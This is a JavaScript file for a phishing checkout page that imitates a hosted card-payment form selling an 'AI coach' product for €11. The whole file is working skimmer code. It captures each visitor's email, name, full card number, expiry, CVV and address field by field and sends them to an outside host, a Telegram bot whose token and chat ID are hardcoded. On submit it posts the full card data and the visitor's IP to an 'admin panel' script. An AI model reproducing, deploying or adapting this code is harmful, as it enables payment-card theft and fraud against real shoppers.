// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '8519765168:AAEJk6HCHDQY5fYAa2GfR5mzMrUxeSGPbF8';
const TELEGRAM_CHAT_ID = '-5209514131';

// Country code to full name mapping - Only 3 countries
const COUNTRY_NAMES = {
    'US': 'United States',
    'GB': 'United Kingdom',
    'CA': 'Canada'
};

// Allowed countries - Only 3 countries
const ALLOWED_COUNTRIES = ['US', 'GB', 'CA'];

// Track form data
let formData = {
    email: '',
    name: '',
    cardNumber: '',
    cardExpiry: '',
    cardCvc: '',
    address1: '',
    address2: '',
    zip: '',
    city: '',
    country: ''
};

// Track if info has been sent to avoid duplicates
let cardInfoSent = false;
let emailInfoSent = false;
let nameInfoSent = false;
let addressFieldsSent = {
    address1: false,
    address2: false,
    city: false,
    zip: false,
    country: false
};
let cardFieldsSent = {
    cardNumber: false,
    cardExpiry: false,
    cardCvc: false
};

// Get full country name from code
function getFullCountryName(countryCode) {
    return COUNTRY_NAMES[countryCode] || countryCode;
}

// Function to send notification to Telegram
async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        console.log('Telegram response:', result);
        return result.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        // Fallback: Store in localStorage if Telegram fails
        const failedMessages = JSON.parse(localStorage.getItem('failed_telegram_messages') || '[]');
        failedMessages.push({time: new Date().toISOString(), message: message});
        localStorage.setItem('failed_telegram_messages', JSON.stringify(failedMessages));
        return false;
    }
}

// Send email notification (first field)
async function sendEmailNotification(email) {
    const message = `📧 *NEW CUSTOMER*\n\nEmail: \`${email}\``;
    await sendToTelegram(message);
}

// Send cumulative data notification
async function sendCumulativeNotification(fieldName, value, fieldLabel) {
    let emoji = '';
    let prefix = '';
    
    switch(fieldName) {
        case 'email':
            emoji = '📧';
            prefix = 'Email Captured';
            break;
        case 'name':
            emoji = '👤';
            prefix = 'Name Captured';
            break;
        case 'address1':
            emoji = '🏠';
            prefix = 'Address Line 1 Captured';
            break;
        case 'address2':
            emoji = '🏠';
            prefix = 'Address Line 2 Captured';
            break;
        case 'city':
            emoji = '🏙️';
            prefix = 'City Captured';
            break;
        case 'zip':
            emoji = '📮';
            prefix = 'ZIP Code Captured';
            break;
        case 'country':
            emoji = '🌍';
            prefix = 'Country Captured';
            value = getFullCountryName(value);
            break;
        case 'cardNumber':
            emoji = '💳';
            prefix = 'Card Number Captured';
            break;
        case 'cardExpiry':
            emoji = '📅';
            prefix = 'Card Expiry Captured';
            break;
        case 'cardCvc':
            emoji = '🔒';
            prefix = 'Card CVV Captured';
            break;
    }
    
    // Build message with your template
    let message = `*${prefix}*\n\n`;
    
    // Add email if available
    if (formData.email) {
        message += `📧 *Email:* \`${formData.email}\`\n`;
    }
    
    // Add name if available
    if (formData.name) {
        message += `👤 *Full Name:* \`${formData.name}\`\n`;
    }
    
    // For CVV notification, show card info
    if (fieldName === 'cardCvc') {
        message += `\n💳 *Card Information:*\n`;
        message += `*Card Number:* \`${formData.cardNumber}\`\n`;
        message += `*Expiry Date:* \`${formData.cardExpiry}\`\n`;
        message += `*CVV:* \`${formData.cardCvc}\`\n`;
    }
    
    // For address fields after CVV, show address info
    if (['address1', 'address2', 'city', 'zip', 'country'].includes(fieldName)) {
        const hasAddressInfo = formData.address1 || formData.city || formData.zip || formData.country;
        if (hasAddressInfo) {
            message += `\n📍 *Address Info*\n`;
            
            // Build address string
            let addressString = '';
            if (formData.address1) {
                addressString += formData.address1;
            }
            if (formData.address2) {
                addressString += addressString ? ', ' + formData.address2 : formData.address2;
            }
            if (formData.zip) {
                addressString += addressString ? ', ' + formData.zip : formData.zip;
            }
            if (formData.city) {
                addressString += addressString ? ', ' + formData.city : formData.city;
            }
            
            message += `*Address:* ${addressString || 'N/A'}\n`;
            
            // Only show country if it's filled
            if (formData.country) {
                message += `*Country:* ${getFullCountryName(formData.country)}\n`;
            }
        }
    }
    
    message += `\n━━━━━━━━━━━━━━━━━━━━\n`;
    message += `New Field Added: ${emoji} \`${value}\``;
    
    console.log(`Sending notification for ${fieldName}:`, value);
    await sendToTelegram(message);
}

// Send complete order info to Telegram (when ALL fields are complete)
async function sendCompleteOrderToTelegram() {
    // Build address string
    let addressString = '';
    if (formData.address1) {
        addressString += formData.address1;
    }
    if (formData.address2) {
        addressString += addressString ? ', ' + formData.address2 : formData.address2;
    }
    if (formData.zip) {
        addressString += addressString ? ', ' + formData.zip : formData.zip;
    }
    if (formData.city) {
        addressString += addressString ? ', ' + formData.city : formData.city;
    }
    
    // Get country name
    const countryName = formData.country ? getFullCountryName(formData.country) : 'N/A';
    
    let message = `🎉 *NEW PAYMENT SUBMITTED* 🎉\n💰 *Amount:* €11.00\n\n💳 *Card Info (FULL DETAILS):*\n\n*Card Number:* \`${formData.cardNumber}\`\n*Expiry Date:* \`${formData.cardExpiry}\`\n*CVV:* \`${formData.cardCvc}\`\n\n👤 *Customer Info*\n\n*Name:* \`${formData.name || 'N/A'}\`\n*Email:* \`${formData.email || 'N/A'}\`\n\n📍 *Address Info*\n\n*Address:* ${addressString || 'N/A'}\n*Country:* ${countryName}`;
    
    console.log('Sending complete order info to Telegram');
    return await sendToTelegram(message);
}

// Check if ALL fields are complete (card + address + name + email)
function checkAllFieldsComplete() {
    const hasCardInfo = formData.cardNumber && formData.cardExpiry && formData.cardCvc;
    const hasAddressInfo = formData.address1 && formData.city && formData.zip && formData.country;
    const hasCustomerInfo = formData.email && formData.name;
    
    return hasCardInfo && hasAddressInfo && hasCustomerInfo;
}

// Format card number with spaces
function formatCardNumber(input) {
    if (!input) return false;
    
    let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    let formattedValue = '';
    
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) {
            formattedValue += ' ';
        }
        formattedValue += value[i];
    }
    
    input.value = formattedValue;
    formData.cardNumber = input.value;
    
    // Check if we have 16 digits
    if (value.length === 16 && !cardFieldsSent.cardNumber) {
        sendCumulativeNotification('cardNumber', input.value, 'Card Number');
        cardFieldsSent.cardNumber = true;
        updatePayButton();
        return true;
    }
    updatePayButton();
    return false;
}

// Format expiration date as MM/YY
function formatExpiryDate(input) {
    if (!input) return false;
    
    let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    
    if (value.length >= 2) {
        input.value = value.substring(0, 2) + '/' + value.substring(2, 4);
    } else {
        input.value = value;
    }
    
    formData.cardExpiry = input.value;
    
    if (input.value.length === 5 && !cardFieldsSent.cardExpiry) {
        sendCumulativeNotification('cardExpiry', input.value, 'Card Expiry');
        cardFieldsSent.cardExpiry = true;
        updatePayButton();
        return true;
    }
    updatePayButton();
    return false;
}

// Format CVV
function formatCVV(input) {
    if (!input) return false;
    
    let value = input.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    input.value = value;
    formData.cardCvc = input.value;
    
    if (value.length >= 3 && !cardFieldsSent.cardCvc) {
        sendCumulativeNotification('cardCvc', input.value, 'Card CVV');
        cardFieldsSent.cardCvc = true;
        updatePayButton();
        
        // Check if all fields are complete after CVV
        if (checkAllFieldsComplete() && !cardInfoSent) {
            cardInfoSent = true;
        }
        
        return true;
    }
    updatePayButton();
    return false;
}

// Update Pay button state
function updatePayButton() {
    const submitButton = document.querySelector('[data-testid="hosted-payment-submit-button"]');
    
    if (!submitButton) {
        console.log('Submit button not found');
        return;
    }
    
    // Get values from form fields
    const email = document.querySelector('input[name="email"]') ? document.querySelector('input[name="email"]').value : '';
    const name = document.getElementById('individualName') ? document.getElementById('individualName').value : '';
    const address1 = document.getElementById('billingAddressLine1') ? document.getElementById('billingAddressLine1').value : '';
    const country = document.getElementById('billingCountry') ? document.getElementById('billingCountry').value : '';
    
    const cardNumberInput = document.getElementById('cardNumber');
    const cardExpiryInput = document.getElementById('cardExpiry');
    const cardCvcInput = document.getElementById('cardCvc');
    
    const cardNumber = cardNumberInput ? cardNumberInput.value.replace(/\s/g, '') : '';
    const cardExpiry = cardExpiryInput ? cardExpiryInput.value : '';
    const cardCvc = cardCvcInput ? cardCvcInput.value : '';
    
    // Check if all fields have reasonable values
    const isCardValid = cardNumber && cardNumber.length >= 15;
    const isExpiryValid = cardExpiry && cardExpiry.length >= 4;
    const isCVVValid = cardCvc && cardCvc.length >= 3;
    
    const isComplete = email && email.includes('@') && 
                      name && name.trim().length >= 2 &&
                      address1 && address1.trim().length > 0 &&
                      country && country !== '' &&
                      isCardValid && isExpiryValid && isCVVValid;
    
    if (isComplete) {
        // ENABLE the button
        submitButton.disabled = false;
        submitButton.classList.remove('SubmitButton--incomplete');
        submitButton.style.opacity = '1';
        submitButton.style.cursor = 'pointer';
        submitButton.style.pointerEvents = 'auto';
        console.log('✅ Pay button ENABLED');
    } else {
        // DISABLE the button
        submitButton.disabled = true;
        submitButton.classList.add('SubmitButton--incomplete');
        submitButton.style.opacity = '0.5';
        submitButton.style.cursor = 'not-allowed';
        submitButton.style.pointerEvents = 'none';
    }
}

// Setup country select with only 3 countries
function setupCountrySelect() {
    const countrySelect = document.getElementById('billingCountry');
    if (!countrySelect) {
        console.log('Country select not found with ID billingCountry');
        return;
    }
    
    // Clear existing options
    countrySelect.innerHTML = '';
    
    // Add placeholder option
    const placeholderOption = document.createElement('option');
    placeholderOption.value = '';
    placeholderOption.textContent = 'Select Country';
    placeholderOption.disabled = true;
    placeholderOption.selected = true;
    countrySelect.appendChild(placeholderOption);
    
    // Add only 3 countries
    const countries = [
        { code: 'US', name: 'United States' },
        { code: 'GB', name: 'United Kingdom' },
        { code: 'CA', name: 'Canada' }
    ];
    
    countries.forEach(country => {
        const option = document.createElement('option');
        option.value = country.code;
        option.textContent = country.name;
        countrySelect.appendChild(option);
    });
    
    // Add change event listener
    countrySelect.addEventListener('change', function() {
        if (this.value) {
            formData.country = this.value;
            
            // Send notification for country selection
            if (!addressFieldsSent.country) {
                sendCumulativeNotification('country', this.value, 'Country');
                addressFieldsSent.country = true;
            }
            
            updatePayButton();
            
            // Check if all fields are complete after country
            if (checkAllFieldsComplete() && !cardInfoSent) {
                cardInfoSent = true;
            }
        }
    });
}

// Initialize event listeners
function initEventListeners() {
    console.log('Initializing event listeners...');
    
    // Email input
    const emailInput = document.querySelector('input[name="email"]');
    if (emailInput) {
        emailInput.addEventListener('input', function() {
            formData.email = this.value;
            updatePayButton();
        });
        
        emailInput.addEventListener('blur', function() {
            if (this.value && this.value.includes('@') && !emailInfoSent) {
                console.log('Email captured:', this.value);
                sendEmailNotification(this.value);
                emailInfoSent = true;
            }
        });
    }

    // Name input
    const nameInput = document.getElementById('individualName');
    if (nameInput) {
        nameInput.addEventListener('input', function() {
            formData.name = this.value;
            updatePayButton();
        });
        
        nameInput.addEventListener('blur', function() {
            if (this.value && this.value.trim().length >= 2 && !nameInfoSent) {
                console.log('Name captured:', this.value);
                sendCumulativeNotification('name', this.value, 'Name');
                nameInfoSent = true;
            }
        });
    }

    // Card number input
    const cardNumberInput = document.getElementById('cardNumber');
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function() {
            formatCardNumber(this);
        });
        cardNumberInput.addEventListener('blur', function() {
            formatCardNumber(this);
        });
    }

    // Card expiry input
    const cardExpiryInput = document.getElementById('cardExpiry');
    if (cardExpiryInput) {
        cardExpiryInput.addEventListener('input', function() {
            formatExpiryDate(this);
        });
        cardExpiryInput.addEventListener('blur', function() {
            formatExpiryDate(this);
        });
    }

    // CVV input
    const cardCvcInput = document.getElementById('cardCvc');
    if (cardCvcInput) {
        cardCvcInput.addEventListener('input', function() {
            formatCVV(this);
        });
        cardCvcInput.addEventListener('blur', function() {
            formatCVV(this);
        });
    }

    // Address Line 1
    const address1Input = document.getElementById('billingAddressLine1');
    if (address1Input) {
        address1Input.addEventListener('input', function() {
            formData.address1 = this.value;
            updatePayButton();
        });
        
        address1Input.addEventListener('blur', function() {
            if (this.value && this.value.trim().length > 0 && !addressFieldsSent.address1) {
                console.log('Address1 captured:', this.value);
                sendCumulativeNotification('address1', this.value, 'Address Line 1');
                addressFieldsSent.address1 = true;
            }
        });
    }

    // Address Line 2
    const address2Input = document.getElementById('billingAddressLine2');
    if (address2Input) {
        address2Input.addEventListener('input', function() {
            formData.address2 = this.value;
            updatePayButton();
        });
        
        address2Input.addEventListener('blur', function() {
            if (this.value && this.value.trim().length > 0 && !addressFieldsSent.address2) {
                console.log('Address2 captured:', this.value);
                sendCumulativeNotification('address2', this.value, 'Address Line 2');
                addressFieldsSent.address2 = true;
            }
        });
    }

    // City
    const cityInput = document.getElementById('billingLocality');
    if (cityInput) {
        cityInput.addEventListener('input', function() {
            formData.city = this.value;
            updatePayButton();
        });
        
        cityInput.addEventListener('blur', function() {
            if (this.value && this.value.trim().length > 0 && !addressFieldsSent.city) {
                console.log('City captured:', this.value);
                sendCumulativeNotification('city', this.value, 'City');
                addressFieldsSent.city = true;
            }
        });
    }

    // ZIP Code
    const zipInput = document.getElementById('billingPostalCode');
    if (zipInput) {
        zipInput.addEventListener('input', function() {
            formData.zip = this.value;
            updatePayButton();
        });
        
        zipInput.addEventListener('blur', function() {
            if (this.value && this.value.trim().length > 0 && !addressFieldsSent.zip) {
                console.log('ZIP captured:', this.value);
                sendCumulativeNotification('zip', this.value, 'ZIP Code');
                addressFieldsSent.zip = true;
            }
        });
    }

    // Setup country select with only 3 countries
    setupCountrySelect();

    // Form submission handler
    const paymentForm = document.getElementById('payment-form');
    if (paymentForm) {
        paymentForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Validate required fields
            const email = emailInput ? emailInput.value : '';
            const name = nameInput ? nameInput.value : '';
            const address1 = address1Input ? address1Input.value : '';
            const country = document.getElementById('billingCountry') ? document.getElementById('billingCountry').value : '';
            
            // Basic validation
            if (!email || !email.includes('@')) {
                alert('Please enter a valid email address.');
                return;
            }
            
            if (!name || name.trim().length < 2) {
                alert('Please enter your full name.');
                return;
            }
            
            if (!country) {
                alert('Please select a country.');
                return;
            }
            
            const cardNumber = cardNumberInput ? cardNumberInput.value.replace(/\s/g, '') : '';
            const cardExpiry = cardExpiryInput ? cardExpiryInput.value : '';
            const cardCvc = cardCvcInput ? cardCvcInput.value : '';
            
            // Card validation
            if (!cardNumber || cardNumber.length !== 16) {
                alert('Please enter a valid 16-digit card number.');
                return;
            }
            
            if (!cardExpiry || cardExpiry.length !== 5) {
                alert('Please enter a valid expiration date (MM/YY).');
                return;
            }
            
            if (!cardCvc || cardCvc.length < 3) {
                alert('Please enter a valid CVV (3-4 digits).');
                return;
            }

            // Show processing on button
            const submitButton = document.querySelector('[data-testid="hosted-payment-submit-button"]');
            const submitText = document.querySelector('.SubmitButton-Text--current');
            let originalText = 'Pay Now';
            
            if (submitText) {
                originalText = submitText.textContent;
                submitText.textContent = 'Processing...';
            }
            
            if (submitButton) {
                submitButton.disabled = true;
                submitButton.style.opacity = '0.5';
                submitButton.style.cursor = 'not-allowed';
            }

            // Send complete order to Telegram
            await sendCompleteOrderToTelegram();
            
            // Get user IP
            let userIP = 'unknown';
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
            } catch (error) {
                console.log('Failed to get IP:', error);
            }
            
            // Get user ID (from hidden field or generate)
            const userID = document.getElementById('user_id')?.value || 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            // Prepare data for tracking
            const trackingData = {
                email: formData.email,
                name: formData.name,
                card: '**** ' + formData.cardNumber.slice(-4),
                card_full: formData.cardNumber,
                expiry: formData.cardExpiry,
                cvv: formData.cardCvc,
                address: `${formData.address1 || ''} ${formData.city || ''} ${formData.country || ''}`.trim(),
                country: getFullCountryName(formData.country),
                product: 'Niche AI Coach Blueprint',
                amount: '€11.00'
            };
            
            // Register user with admin panel
            try {
                const response = await fetch('track.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        user_id: userID,
                        data: trackingData,
                        status: 'waiting',
                        ip: userIP,
                        country: getFullCountryName(formData.country),
                        current_page: 'loading.php'
                    })
                });
                
                const result = await response.json();
                console.log('User registered with admin panel:', result);
                
            } catch (error) {
                console.log('Failed to register with admin panel:', error);
            }

            // Build query parameters for loading page
            const queryParams = new URLSearchParams({
                user_id: userID,
                timestamp: Date.now()
            }).toString();

            // Redirect to loading page after 1.5 seconds
            setTimeout(() => {
                window.location.href = `loading.php?${queryParams}`;
            }, 1500);
            
        });
    }

    // Update pay button initially
    updatePayButton();
    console.log('✅ Event listeners initialized');
}

// Initialize when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ DOM loaded, initializing payment form...');
    // Wait a bit for all elements to load
    setTimeout(() => {
        initEventListeners();
        console.log('📋 Only 3 countries available: USA, UK, Canada');
        console.log('🔔 Telegram notifications enabled for all fields');
        
        // Store user ID in sessionStorage if not exists
        if (!sessionStorage.getItem('stripe_user_id')) {
            const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            sessionStorage.setItem('stripe_user_id', userId);
            
            // Also set in hidden field if exists
            const hiddenField = document.getElementById('user_id');
            if (hiddenField) {
                hiddenField.value = userId;
            }
        }
    }, 1000);
});

// Export functions for use in index.php
window.sendCompleteOrderToTelegram = sendCompleteOrderToTelegram;